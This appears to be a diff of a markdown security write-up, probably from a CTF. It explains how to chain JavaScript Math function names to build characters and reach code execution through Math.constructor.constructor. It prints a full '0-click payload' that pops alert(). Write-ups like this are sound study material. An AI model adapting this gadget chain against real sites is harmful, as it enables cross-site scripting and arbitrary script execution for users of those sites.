@@ -174,7 +174,6 @@ We can craft a blank space using `Math.random.name.toString` and so now let’s 
 
 ![img1](./imgs/6.png)
 
-Now the only problems we have are:
 - We need to create characters which don't exist in function names like `(.)`
 - `Array.push()` returns a new array length, which will create constant pain with `.toString()` and `.at()`
 
@@ -246,6 +245,7 @@ Now we need to shift the first element and push it to get `)alert(`
 
 The new problem occurs when we have to create the `.` character, we will again rely on `String.fromCharCode`, now we need to get the value 46 from 15 somehow… Since e is close enough to 2 we can play with e^x and log2(x). We’ve found the exact value of x after different tests:
 
+
 $$
 log_2(e^{32}) \approx 46
 $$
@@ -277,3 +277,4 @@ The final 0-click payload looks like this:
 `Math.random.name.localeCompare.name.length.toString,Math.log2,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.expm1,Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.floor,Math.random.name.anchor.name.at,Math.seeds.push,Math.acos,Math.random.prototype.constructor.name.link.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.cbrt,Math.log2,Math.trunc.name.at,Math.seeds.push,Math.seeds.shift,Math.seeds.push,Math.clz32,Math.sqrt,Math.fround.name.at,Math.seeds.push,Math.cbrt,Math.acos.name.at,Math.seeds.push,Math.log10,Math.cos.name.at,Math.seeds.push,Math.cbrt,Math.trunc.name.at,Math.seeds.push,Math.log2,Math.expm1.name.at,Math.seeds.push,Math.log2,Math.seeds.at,Math.seeds.push,Math.log2,Math.trunc.name.at,Math.seeds.push,Math.cos,Math.trunc.name.at,Math.seeds.push,Math.cos,Math.clz32,Math.exp,Math.log2,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.asinh,Math.round,Math.seeds.find.name.at,Math.seeds.push,Math.asinh,Math.round,Math.seeds.isPrototypeOf.name.at,Math.seeds.push,Math.cos,Math.seeds.map.name.at,Math.seeds.push,Math.sin,Math.seeds.at.name.at,Math.seeds.push,Math.sin,Math.seeds.includes.name.at,Math.seeds.push,Math.cbrt,Math.seeds.find.name.at,Math.seeds.push,Math.seeds.shift,Math.seeds.push,Math.random.name.toString,Math.seeds.join,Math.constructor.constructor,Math.constructor.call.call`
 
 ![img1](./imgs/10.png)
+
